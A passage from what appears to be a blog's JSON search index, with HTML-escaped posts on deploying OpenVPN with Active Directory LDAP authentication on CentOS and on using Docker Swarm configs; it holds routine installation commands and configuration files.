2020","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200917-5b892a0b2b71775d1ce04eff/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.twblogs.net/a/5b892a0b2b71775d1ce04eff\" target=\"_blank\" rel=\"noopener\"\u003eopenvpn 部署之部署基於 AD 域認證\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jameschien.no-ip.biz/wordpress/2020/02/19/openvpn-pam-sssd-active-directory/\" target=\"_blank\" rel=\"noopener\"\u003eOpenVPN + PAM + SSSD + Active Directory\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://computingforgeeks.com/install-and-configure-openvpn-server-on-rhel-centos-8/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://computingforgeeks.com/install-and-configure-openvpn-server-on-rhel-centos-8/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.redhat.com/en/blog/consistent-security-crypto-policies-red-hat-enterprise-linux-8\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.redhat.com/en/blog/consistent-security-crypto-policies-red-hat-enterprise-linux-8\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/jerrynotes/linux-authentication-windows-ad-without-join-domain-7963c3fd44c5\" target=\"_blank\" rel=\"noopener\"\u003ehttps://medium.com/jerrynotes/linux-authentication-windows-ad-without-join-domain-7963c3fd44c5\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安裝openvpn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install openvpn -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum -y install openssl openssl-devel -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum -y install lzo lzo-devel  -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install -y libgcrypt libgpg-error libgcrypt-devel\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安裝openvpn認證插件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install openvpn-auth-ldap -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安裝easy-rsa\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 由於openvpn2.3之後，在openvpn裏面剔除了easy-rsa文件，所以需要單獨安裝\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install easy-rsa\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp -rf /usr/share/easy-rsa/2.0 /etc/opevpn/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 生成openvpn的key及證書\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 修改 `/opt/openvpn/etc/easy-rsa/2.0/vars` 參數\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexport KEY_COUNTRY\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;CN\u0026#34;\u003c/span\u003e                \u003cspan style=\"color:#75715e\"\u003e# 國家\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexport KEY_PROVINCE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ZJ\u0026#34;\u003c/span\u003e               \u003cspan style=\"color:#75715e\"\u003e# 省份\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexport KEY_CITY\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;NingBo\u0026#34;\u003c/span\u003e               \u003cspan style=\"color:#75715e\"\u003e# 城市\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexport KEY_ORG\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;TEST-VPN\u0026#34;\u003c/span\u003e              \u003cspan style=\"color:#75715e\"\u003e# 組織\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexportKEY_EMAIL\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;81367070@qq.com\u0026#34;\u003c/span\u003e      \u003cspan style=\"color:#75715e\"\u003e# 郵件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexport KEY_OU\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;baidu\u0026#34;\u003c/span\u003e                  \u003cspan style=\"color:#75715e\"\u003e# 單位\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esource vars\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./clean-all\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./build-ca\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./build-dh\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./build-key-server server\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./build-key client1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 編輯openvpn服務端配置文件：`/etc/openvpn/server.conf`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eport \u003cspan style=\"color:#ae81ff\"\u003e1194\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eproto udp\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edev tun\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eca keys/ca.crt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecert keys/server.crt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekey keys/server.key  \u003cspan style=\"color:#75715e\"\u003e# This file should be kept secret\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edh keys/dh2048.pem\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eserver 10.8.0.0 255.255.255.0    //客戶端分配的ip地址\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epush \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;route 192.168.1.0 255.255.255.0\u0026#34;\u003c/span\u003e  //推送客戶端的路由\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epush \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;redirect-gateway\u0026#34;\u003c/span\u003e   //修改客戶端的網關，使其直接走vpn流量\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eifconfig-pool-persist ipp.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekeepalive \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e120\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecomp-lzo\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epersist-key\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epersist-tun\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003estatus openvpn-status.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003everb \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eplugin /usr/lib64/openvpn/plugin/lib/openvpn-auth-ldap.so \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/etc/openvpn/auth/ldap.conf\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eclient-cert-not-required\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eusername-as-common-name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elog /var/log/openvpn.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 修改openvpn-ldap-auth的配置文件 `/etc/openvpn/auth/ldap.conf`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# /etc/openvpn/auth/ldap.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;LDAP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# LDAP server URL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 更改爲 AD 服務器的 IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    URL ldap://172.16.76.238:389\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Bind DN (If your LDAP server doesn\u0026#39;t support anonymous binds)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# BindDN uid=Manager,ou=People,dc=example,dc=com\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 更改爲域管理的 DN, 可以通過 ldapsearch 進行查詢\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# -h 的 ip 替換爲服務器 ip，-D 換爲管理員的 dn，-b 爲基礎的查詢 dn，* 爲所有\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# ldapsearch -LLL -x -h 172.16.76.238 -D \u0026#34;administrator@xx.com\u0026#34; -W -b \u0026#34;dc=xx,dc=com\u0026#34; \u0026#34;*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    BindDN \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cn=administrator,cn=Users,dc=xx,dc=com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Bind Password\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Password SecretPassword\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 域管理員的密碼\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Password passwd\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Network timeout (in seconds)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Timeout \u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Enable Start TLS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    TLSEnable no\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Follow LDAP Referrals (anonymously)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    FollowReferrals no\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# TLS CA Certificate File\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# TLSCACertFile /usr/local/etc/ssl/ca.pem\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# TLS CA Certificate Directory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# TLSCACertDir /etc/ssl/certs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Client Certificate and key\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# If TLS client authentication is required\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# TLSCertFile /usr/local/etc/ssl/client-cert.pem\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# TLSKeyFile /usr/local/etc/ssl/client-key.pem\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Cipher Suite\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# The defaults are usually fine here\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# TLSCipherSuite ALL:!ADH:@STRENGTH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;/LDAP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;Authorization\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Base DN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 查詢認證的基礎 dn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    BaseDN \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dc=boqii-inc,dc=com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# User Search Filter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# SearchFilter \u0026#34;(\u0026amp;(uid=%u)(accountStatus=active))\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 其中 sAMAccountName=%u 的意思是把 sAMAccountName 的字段取值爲用戶名，\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 後面 \u0026#34;memberof=CN=myvpn,DC=xx,DC=com\u0026#34; 指向要認證的 vpn 用戶組，\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 這樣任何用戶使用 vpn，只要加入這個組就好了\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    SearchFilter \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;(\u0026amp;(sAMAccountName=%u)(memberof=CN=myvpn,DC=boqii-inc,DC=com))\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Require Group Membership\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    RequireGroup false\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Add non-group members to a PF table (disabled)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# PFTable ips_vpn_users\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;Group\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# BaseDN \u0026#34;ou=Groups,dc=example,dc=com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# SearchFilter \u0026#34;(|(cn=developers)(cn=artists))\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# MemberAttribute uniqueMember\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# Add group members to a PF table (disabled)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# PFTable ips_vpn_eng\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        BaseDN \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ou=vpn,dc=boqii-inc,dc=com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        SearchFilter \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;(cn=openvpn)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        MemberAttribute \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;member\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u0026lt;/Group\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;/Authorization\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e拷貝\u003ccode\u003e/etc/openvpn/key\u003c/code\u003e目錄下的\u003ccode\u003eca.crt\u003c/code\u003e證書，以備客戶端使用。\u003c/p\u003e","tags":["URL","Linux","Windows","AD","LDAP","VPN"],"title":"openvpn部署之部署基於AD域認證"},{"categories":["URL","Docker"],"contents":" Docker Tips: Using Docker Config FROM nginx:1.13.6 COPY nginx.conf /etc/nginx/nginx.conf Using the Docker CLI, we can create a config from this configuration file, we name this config proxy.\n$ docker config create proxy nginx.conf mdcfnxud53ve6jgcgjkhflg0s $ docker config inspect proxy [ { \u0026#34;ID\u0026#34;: \u0026#34;x06uaozphg9kbnf8g4az4mucn\u0026#34;, \u0026#34;Version\u0026#34;: { \u0026#34;Index\u0026#34;: 2723 }, \u0026#34;CreatedAt\u0026#34;: \u0026#34;2017-11-21T07:49:09.553666064Z\u0026#34;, \u0026#34;UpdatedAt\u0026#34;: \u0026#34;2017-11-21T07:49:09.553666064Z\u0026#34;, \u0026#34;Spec\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;proxy\u0026#34;, \u0026#34;Labels\u0026#34;: {}, \u0026#34;Data\u0026#34;: \u0026#34;dXNlciB3d3ctZGF0YTsKd29y...ogIgICAgIH0KICAgIH0KfQo=\u0026#34; } } ] Use a Config $ docker network create --driver overlay front $ docker service create --name api --network front lucj/api $ docker service create --name proxy \\ --network front \\ --config src=proxy,target=/etc/nginx/nginx.conf \\ --port 8000:8000 \\ nginx:1.13.6 Service Update When the content of a configuration needs to be modified, it\u0026rsquo;s a common pattern to create a new config (using docker config create), and then to update the service order to remove the access to the previous config, and to add the access to the new one. The service commands are--config-rm and --config-add.\n$ docker config create proxy-v2 nginx-v2.conf xtd1s1g6b5zukjhvup5vi4jzd $ docker service update --config-rm proxy --config-add src=proxy-v2,target=/etc/nginx/nginx.conf proxy Note: by default, when a config is attached to a service, it is available in the /config_name file. We then need to explicitly define the location using the target option.\n","date":"September 14, 2020","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200914-about-using-docker-config/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/better-programming/about-using-docker-config-e967d4a74b83\" target=\"_blank\" rel=\"noopener\"\u003eDocker Tips: Using Docker Config\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e nginx:1.13.6\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCOPY\u003c/span\u003e nginx.conf /etc/nginx/nginx.conf\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eUsing the Docker CLI, we can create a \u003ccode\u003econfig\u003c/code\u003e from this configuration file, we name this config \u003ccode\u003eproxy\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ docker config create proxy nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emdcfnxud53ve6jgcgjkhflg0s\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ docker config inspect proxy\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan 